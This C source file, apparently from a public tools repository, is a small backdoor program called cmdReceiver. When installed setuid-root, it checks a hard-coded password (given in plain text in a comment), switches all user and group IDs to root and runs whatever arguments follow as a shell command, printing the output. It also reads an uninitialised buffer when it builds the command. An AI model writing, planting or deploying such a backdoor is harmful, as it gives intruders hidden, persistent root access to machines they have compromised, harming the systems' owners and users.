/*
* https://github.com/indra-kr/Tools/blob/master/cmdReceiver/cmdReceiver.c
*/
/* 
* Compile: cc -o cmdReceiver cmdReceiver.c -lcrypt
*/
#define _XOPEN_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define SETUID  0
#define SETUSR  "root"

// Password is "C0d3DbY1ndr4"
int authenticate(const char *str)
{
        char salt[] = "$6$X39jRo1Cm8Ao3f2", *epass = "j3TNIL5zr7c4RV/UpETulCNkb0qItFfMr8k6NO4oJk/c2Nycjz2NQEuDn3jr2kA2ns2yRTCs1bzNNVCCxv./u1";
        char *enc = NULL;
        int ret = 0;
        unsigned char c = 0;

        enc = crypt(str, salt);
  
        if(memcmp(epass, enc + strlen(salt) + 1, strlen(epass)) == 0) {
                return 0;
        }
        return -1;
}

int main(int argc, char **argv)
{
        char cmdline[8192];
        int i = 0, j = 2;
        FILE *fp = NULL;

        if(argc <= 2) return 0;
        if(authenticate(argv[1]) != 0) return 0;

        setregid(SETUID,SETUID); setreuid(SETUID,SETUID);
        setegid(SETUID); seteuid(SETUID);
        setgid(SETUID); setuid(SETUID);
        initgroups(SETUSR, SETUID);

        for(i = 2; i < argc; i++) {
                snprintf(cmdline + strlen(cmdline),
                                sizeof(cmdline) - strlen(cmdline),
                                "%s ", argv[i]);
        }
        if((fp = popen(cmdline, "r")) == NULL) {
                printf("popen failed\n");
                return -1;
        }
        while(fgets(cmdline, sizeof(cmdline), fp) != NULL) {
        	printf("%s", cmdline);
        }
        pclose(fp);
}
